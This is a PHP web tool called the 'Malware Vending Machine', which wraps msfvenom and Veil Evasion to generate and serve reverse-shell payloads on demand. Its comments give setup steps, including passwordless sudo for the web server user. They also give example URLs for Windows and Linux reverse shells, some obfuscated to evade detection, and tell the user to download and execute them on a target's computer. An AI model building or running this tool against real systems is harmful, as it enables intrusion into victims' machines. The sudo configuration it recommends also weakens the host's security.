<?php 
/*
	MVM.php - The Malware Vending Machine
	A simplified, CLI-friendly web API for msfvenom (and Veil 3.x)
	
	Conveniently generate and download reverse shells to a target in one step!
	Share shells with your friends!

	Warning: Probably not secure against "hacking back" 
		- don't run unattended or when not needed.
	Use only legally and ethically

*/

/*
	Setup:
*/

///////////////////////////
// Install Veil 3.x following the instructions there
//////////////////////////

/*
https://github.com/Veil-Framework/Veil
This file assumes you used the git method from your home dir (/root/Veil)
*/

///////////////////////////
// Follow the instructions at the link to install XSendFile
//////////////////////////

/*
https://tn123.org/mod_xsendfile/
apt-get install apache-dev -y
apxs -cia mod_xsendfile.c
*/

///////////////////////////
// Use visudo to add these lines to your sudoers file
//////////////////////////
/*
visudo
www-data        ALL=NOPASSWD:   /root/Veil/Veil.py
www-data        ALL=NOPASSWD:   /usr/bin/msfvenom
*/

///////////////////////////
// Add these lines to /etc/apache2/apache2.conf
//////////////////////////

/*
#enable xsendfile
XSendFile On

#enable sending files from vending machine output
XSendFilePath /var/lib/veil/output/compiled
*/


///////////////////////////
// Restart apache
//////////////////////////

/*
service apache2 restart
*/

///////////////////////////
// Make log writable
//////////////////////////
/*
touch /var/www/vending.log
chown www-data /var/www/vending.log
*/

///////////////////////////
// Troubleshooting
//////////////////////////
/*
tail /var/log/apache2/error.log #check timestamps
//If you have permission denied, check the sudo setup
//and try chmod a+w /var/lib/veil/output/compiled/
*/


///////////////////////////
// Examples
//////////////////////////
//Download a 10.x.x.x:8080 exe reverse shell (msfvenom)
//Only provide valid msfvenom options.
// http://10.x.x.x/mvm.php?p=windows/shell_reverse_tcp&a=x86&e=x86/shikata_ga_nai&i=15&f=exe&LPORT=8080

//Linux reverse shell (defaults to port 443, msfvenom assumes arch from payload, etc)
// http://10.x.x.x/mvm.php?p=linux/x86/shell_reverse_tcp&f=elf

//Windows reverse shell, concealed / obfuscated with veil evasion
// http://10.x.x.x/mvm.php?p=windows/shell_reverse_tcp&LPORT=443&veil=1'

///////////////////////////
// From a target's computer, download and execute the file
// using something like wget or wget.vbs
//////////////////////////



$outdir = '/var/lib/veil/output/compiled';
//^ I don't know how to change this in veil. Must be writable by web server.
$log_path = '/var/www/vending.log';
$veil_path = '/root/Veil/';

function optional($arg, $default=null) {
	$val=isset($_GET[$arg]) ? $_GET[$arg] : $default;
	if ( isset($val) ) {
		return ' '.escapeshellarg('-'.$arg).' '.escapeshellarg($val);
	} else {
		return '';
	}
};

//placeholder for real logic - just use it right
function usage(){
	$required = array('p');
	foreach ($required as $arg) {
		if (!isset($_GET[$arg])) {
			return false;
		}
	}
	return true;
};

function payload_args($ip, $port) {

	$exitfunc=$_GET['EXITFUNC'] ?: 'process';
	return ' LHOST='.$ip.' LPORT='.$port.' EXITFUNC='.escapeshellarg($exitfunc);
}

//print_r( $_GET);

$file=tempnam($outdir, '');
$port=escapeshellarg($_GET['LPORT'] ?: '443');
$ip=escapeshellarg($_SERVER['SERVER_ADDR']);

if (isset($_GET['veil'])) {
	chdir($veil_path);
	$cmd=$veil_path.'Veil.py -t Evasion -p 29 --msfvenom '.escapeshellarg($_GET['p']).' --ip '.$ip.' --port '.$port.' -o '.basename($file);

	$file=$file.'.exe';
} else {
	$cmd='msfvenom -p '.escapeshellarg($_GET['p']).optional('a').optional('e').optional('i').optional('f').payload_args($ip, $port).' -o '.escapeshellarg($file);
}


file_put_contents($log_path, $_SERVER['REMOTE_ADDR'].':'.$cmd.PHP_EOL , FILE_APPEND | LOCK_EX);

//print($cmd.PHP_EOL);

echo shell_exec('sudo '.$cmd. ' 2>&1');

header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('X-Sendfile: '.$file);
header('Content-Disposition: attachment; filename="'.basename($file).'"');

/*
header('Expires: 0');
header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
header('Pragma: public');
header('Content-Length: '.filesize($file));
flush();
readfile($file);
*/
?>
